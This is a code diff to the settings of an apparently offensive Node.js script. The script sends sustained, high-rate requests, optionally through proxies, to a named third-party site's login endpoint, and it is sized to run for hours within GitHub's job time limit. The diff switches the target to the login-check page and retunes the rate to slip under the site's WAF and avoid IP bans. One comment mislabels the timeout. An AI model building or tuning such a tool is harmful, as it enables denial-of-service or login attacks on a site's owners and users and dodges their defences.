@@ -6,9 +6,9 @@ import http from 'http';
 import { HttpsProxyAgent } from 'https-proxy-agent';
 
 // Configurable constants
-const TARGET_URL = process.env.TARGET_URL || 'https://2.52gs.co/user.php';
+const TARGET_URL = process.env.TARGET_URL || 'https://2.52gs.co/chklogin.php';
 const TEST_DURATION_MINUTES = parseInt(process.env.TEST_DURATION_MINUTES) || 330; // 5.5 hours (leaves 30 min buffer for GitHub's 6-hour limit)
-const TARGET_RPS = parseInt(process.env.TARGET_RPS) || 66667; // Sustainable rate to avoid WAF blocks
+const TARGET_RPS = parseInt(process.env.TARGET_RPS) || 60; // Limit to 60 requests per second to avoid HTTP 429 WAF bans
 const CONCURRENCY_LIMIT = parseInt(process.env.CONCURRENCY_LIMIT) || 1000; // Conservative to avoid IP bans
 const REQUEST_TIMEOUT_MS = parseInt(process.env.REQUEST_TIMEOUT_MS) || 5000; // 10 seconds timeout per call
 const PROXY_URL = process.env.PROXY_URL || ''; // Optional: proxy URL (e.g. http://user:pass@host:port)
